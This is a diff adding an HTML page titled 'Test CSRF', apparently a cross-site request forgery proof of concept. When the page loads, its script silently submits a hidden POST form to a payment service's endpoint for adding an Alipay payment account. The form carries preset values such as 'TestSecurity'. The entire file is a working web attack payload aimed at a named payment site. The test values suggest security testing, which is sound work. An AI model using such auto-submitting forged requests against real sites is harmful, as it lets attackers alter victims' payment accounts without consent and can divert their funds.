@@ -1,0 +1,51 @@
+<html>
+<head>
+<title>Test CSRF</title>
+</head>
+
+<body onload="javascript:fireForms()">
+<script language="JavaScript">
+var pauses = new Array( "302","165","215" );
+
+function pausecomp(millis)
+{
+    var date = new Date();
+    var curDate = null;
+
+    do { curDate = new Date(); }
+    while(curDate-date < millis);
+}
+
+function fireForms()
+{
+    var count = 3;
+    var i=0;
+    
+    for(i=0; i<count; i++)
+    {
+        document.forms[i].submit();
+        
+        pausecomp(pauses[i]);
+    }
+}
+    
+</script>
+<form method="POST" name="form0" action="https://pre-im.hihipay.net:443/apps/paymentAccount/alipay/add">
+<input type="hidden" name="accountType" value="ALIPAY"/>
+<input type="hidden" name="autoScore" value="0"/>
+<input type="hidden" name="displayType" value="ACCOUNT"/>
+<input type="hidden" name="accountConfigType" value="ATA"/>
+<input type="hidden" name="cardAlias" value=""/>
+<input type="hidden" name="alipayUserId" value=""/>
+<input type="hidden" name="accountNo" value="TestSecurity"/>
+<input type="hidden" name="bankAlias" value=""/>
+<input type="hidden" name="accountName" value="TestSecurty"/>
+<input type="hidden" name="bank" value=""/>
+<input type="hidden" name="remarks" value="TestSecurity"/>
+<input type="hidden" name="genPostscript" value="0"/>
+<input type="hidden" name="imgFile" value=""/>
+<input type="hidden" name="qrcodeUrl" value=""/>
+</form>
+
+</body>
+</html>
